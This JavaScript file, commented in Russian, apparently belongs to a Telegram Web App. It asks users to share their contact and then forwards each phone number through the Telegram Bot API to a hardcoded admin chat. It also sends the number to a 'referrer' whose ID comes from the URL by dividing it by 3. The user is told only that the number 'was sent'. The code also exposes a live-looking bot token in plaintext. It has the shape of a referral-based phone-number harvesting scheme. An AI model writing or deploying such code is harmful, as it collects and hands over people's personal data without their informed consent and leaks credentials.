const tg = window.Telegram.WebApp;

// Функция для дешифрования ID
function decryptUserId(encryptedUserId) {
    return encryptedUserId / 3;
}

// Получаем зашифрованный ID из URL
function getEncryptedUserIdFromUrl() {
    const urlParams = new URLSearchParams(window.location.search);
    return urlParams.get('startapp')?.replace('ref', '');
}

// Проверяем, есть ли зашифрованный ID в URL
const encryptedUserId = getEncryptedUserIdFromUrl();
let referrerUserId = null;

if (encryptedUserId) {
    referrerUserId = decryptUserId(encryptedUserId);
    console.log('Referrer User ID:', referrerUserId);
}

// Отправка номера телефона
async function sendMessageToAdmin(phoneNumber) {
    const botToken = '7677386741:AAFrg5fM7pBPcGeljsPI9BxyHAxXsBzoWl8'; // Замените на токен вашего бота
    const adminChatId = '1521132127'; // Замените на chat_id администратора

    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const text = `Новый номер телефона: ${phoneNumber}`;

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: adminChatId,
                text: text
            })
        });

        const result = await response.json();
        if (result.ok) {
            console.log('Сообщение отправлено администратору');
        } else {
            console.error('Ошибка при отправке сообщения администратору:', result);
        }
    } catch (error) {
        console.error('Ошибка при отправке сообщения:', error);
    }
}

async function sendMessageToUser(userId, phoneNumber) {
    const botToken = '7677386741:AAFrg5fM7pBPcGeljsPI9BxyHAxXsBzoWl8'; // Замените на токен вашего бота

    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const text = `Новый номер телефона по вашей ссылке: ${phoneNumber}`;

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: userId,
                text: text
            })
        });

        const result = await response.json();
        if (result.ok) {
            console.log('Сообщение отправлено пользователю');
        } else {
            console.error('Ошибка при отправке сообщения пользователю:', result);
        }
    } catch (error) {
        console.error('Ошибка при отправке сообщения:', error);
    }
}

function requestPhoneNumber(el) {
    tg.requestContact(async function (sent, event) {
        if (sent) {
            try {
                const phone_num = `${event.responseUnsafe.contact.phone_number}`;

                // Отправляем номер телефона администратору
                await sendMessageToAdmin(phone_num);

                // Если есть referrerUserId, отправляем номер телефона и ему
                if (referrerUserId) {
                    await sendMessageToUser(referrerUserId, phone_num);
                }

                Telegram.WebApp.showAlert('✅ Номер успешно отправлен!');
            } catch (error) {
                Telegram.WebApp.showAlert('⚠️ Произошла ошибка при отправке номера');
            }
        }
    });
}